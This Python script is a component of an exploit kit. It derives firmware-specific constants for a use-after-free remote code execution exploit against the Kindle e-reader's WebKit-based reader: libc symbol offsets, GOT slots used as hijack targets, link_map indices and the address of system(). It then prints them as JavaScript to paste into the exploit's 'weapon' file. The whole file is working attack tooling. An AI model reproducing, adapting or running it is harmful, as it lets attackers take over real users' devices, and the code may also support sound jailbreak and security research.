#!/usr/bin/env python3
"""Derive the firmware-specific constants for the sort-UAF book-open RCE exploit.

usage:
  derive_offsets.py <libc.so.6> <libwebkitgtk.so.0.x> <webreader>          # JS fragment
  derive_offsets.py --json <libc.so.6> <libwebkitgtk.so.0.x> <webreader>   # JSON dict

Reads three binaries (from any Kindle firmware rootfs) and emits the constants the exploit
needs. The link_map walk in the exploit removes the libc->webkit gap, so these are the ONLY
remaining per-firmware numbers — and they're all in these files.

Importable: `from derive_offsets import derive` returns the dict.
"""
import subprocess, sys, re, json

def nm_offset(lib, sym):
    """st_value (offset from base) of a defined dynamic symbol in `lib`."""
    out = subprocess.run(["nm", "-D", "--defined-only", lib],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            name = parts[2].split("@@")[0].split("@")[0]
            if name == sym:
                return int(parts[0], 16)
    raise SystemExit(f"symbol {sym!r} not found in {lib}")

def needed_pos(binpath, soname):
    """1-based index of soname in the binary's DT_NEEDED list."""
    out = subprocess.run(["readelf", "-d", binpath],
                         capture_output=True, text=True).stdout
    pos = 0
    for line in out.splitlines():
        if "(NEEDED)" in line:
            pos += 1
            m = re.search(r"\[(.*?)\]", line)
            if m and soname in m.group(1):
                return pos
    raise SystemExit(f"{soname!r} not in DT_NEEDED of {binpath}")

def got_slot(binpath, sym):
    """R_ARM_JUMP_SLOT relocation offset (the GOT slot) for a dynamic symbol.

    Matches the symbol name exactly (so `free` != `g_free`)."""
    out = subprocess.run(["readelf", "-r", binpath],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        f = line.split()
        if len(f) >= 5 and f[2] == "R_ARM_JUMP_SLOT":
            name = f[-1].split("@")[0]
            if name == sym:
                return int(f[0], 16)
    raise SystemExit(f"{sym!r} GOT slot not found in {binpath}")

def candidates(webreader, libc):
    """Return [[got_slot, libc_offset], ...] for every libc symbol webreader imports.

    Each entry pairs a webreader R_ARM_JUMP_SLOT relocation offset (the GOT slot)
    with the symbol's st_value in libc. Reading the GOT slot at runtime yields the
    symbol's address; subtracting libc_offset yields the libc base — *regardless of
    which symbol is resolved on this firmware* (lazy slots hold a low PLT stub and
    are rejected by the weapon's range check). This is the runtime "which symbol is
    resolved" derivation: the weapon tries them all and keeps the first that lands
    in the libc ASLR range.
    """
    return [c[:2] for c in candidates_named(webreader, libc)]

def candidates_named(webreader, libc):
    """Like candidates() but returns [[got_slot, libc_offset, symbol_name], ...]."""
    libc_syms = {}
    out = subprocess.run(["nm", "-D", "--defined-only", libc],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            name = parts[2].split("@@")[0].split("@")[0]
            libc_syms[name] = int(parts[0], 16)

    cands = []
    out = subprocess.run(["readelf", "-r", webreader],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        f = line.split()
        if len(f) >= 5 and f[2] == "R_ARM_JUMP_SLOT":
            name = f[-1].split("@")[0]
            if name in libc_syms:
                cands.append([int(f[0], 16), libc_syms[name], name])
    if not cands:
        raise SystemExit(f"no libc-imported R_ARM_JUMP_SLOT symbols found in {webreader}")
    return cands

def e_entry(binpath):
    """ELF entry point (build-unique fingerprint; the runtime table match key)."""
    out = subprocess.run(["readelf", "-h", binpath],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        if "Entry point" in line:
            return int(line.split()[-1], 16)
    raise SystemExit("no e_entry in " + binpath)


def webreader_layout(binpath):
    """Return (base, got_lo, got_hi) from the webreader's program headers.

    base    = first PT_LOAD vaddr (webreader is non-PIE; ELF-header walk base).
    got_lo/hi = page-aligned RW PT_LOAD range (where the GOT scan runs).
    """
    out = subprocess.run(["readelf", "-lW", binpath], capture_output=True, text=True).stdout
    base = rw_vaddr = rw_memsz = None
    for line in out.splitlines():
        f = line.split()
        if f and f[0] == "LOAD":
            vaddr, memsz = int(f[2], 16), int(f[5], 16)
            if base is None:
                base = vaddr
            rw_vaddr, rw_memsz = vaddr, memsz  # last LOAD is the RW segment
    if base is None:
        raise SystemExit("no LOAD segments in " + binpath)
    got_lo = rw_vaddr & ~0xFFF
    got_hi = (rw_vaddr + rw_memsz + 0xFFF) & ~0xFFF
    return base, got_lo, got_hi

def derive(libc, webkit, webreader):
    """Return the per-firmware constants as a dict."""
    syms = ["strlen", "strcmp", "atoi", "memcpy", "getenv",
            "__strdup", "__getpid", "__clock_gettime", "qsort"]
    O = [nm_offset(libc, s) for s in syms]
    environ = nm_offset(libc, "__environ")

    # g_get_current_time GOT slot: the R_ARM_JUMP_SLOT relocation offset in libwebkitgtk.
    r = subprocess.run(["readelf", "-r", webkit], capture_output=True, text=True).stdout
    got = None
    for line in r.splitlines():
        if "g_get_current_time" in line:
            got = int(line.split()[0], 16)
    if got is None:
        raise SystemExit("g_get_current_time relocation not found in " + webkit)

    wk_pos = needed_pos(webreader, "libwebkitgtk")
    libc_pos = needed_pos(webreader, "libc.so.6")
    base, got_lo, got_hi = webreader_layout(webreader)

    # stage5d (g_strcmp0->system + XHR) constants
    system = nm_offset(libc, "system")
    g_strcmp0_got = got_slot(webreader, "g_strcmp0")
    free_got = got_slot(webreader, "free")
    cands = candidates(webreader, libc)

    return {
        "e_entry": e_entry(webreader),
        "O": O,
        "O_syms": syms,
        "__environ": environ,
        "g_get_current_time_got": got,
        "webkit_index": wk_pos + 2,
        "libc_index": libc_pos + 2,
        "webreader_base": base,
        "webreader_got_lo": got_lo,
        "webreader_got_hi": got_hi,
        "system": system,
        "g_strcmp0_got": g_strcmp0_got,
        "free_got": free_got,
        "candidates": cands,
    }

def main():
    args = sys.argv[1:]
    as_json = args and args[0] == "--json"
    if as_json:
        args = args[1:]
    if len(args) != 3:
        sys.exit(__doc__.splitlines()[2] + "\n" + __doc__.splitlines()[3])
    libc, webkit, webreader = args
    d = derive(libc, webkit, webreader)

    if as_json:
        print(json.dumps(d, indent=2))
        return

    print("// Derived constants — paste into sort_linkmap_weapon.js")
    print("var O=[" + ",".join(f"0x{x:x}" for x in d["O"]) + "];  // " + ", ".join(d["O_syms"]))
    print(f"var ENVIRON=0x{d['__environ']:x};          // __environ")
    print(f"var GOT_CURRENT_TIME=0x{d['g_get_current_time_got']:x};    // g_get_current_time GOT slot (hijack target)")
    print(f"var WK_IDX={d['webkit_index']};              // link_map index of libwebkitgtk (NEEDED + 2)")
    print(f"var LIBC_IDX={d['libc_index']};           // link_map index of libc (NEEDED + 2)")

if __name__ == "__main__":
    main()
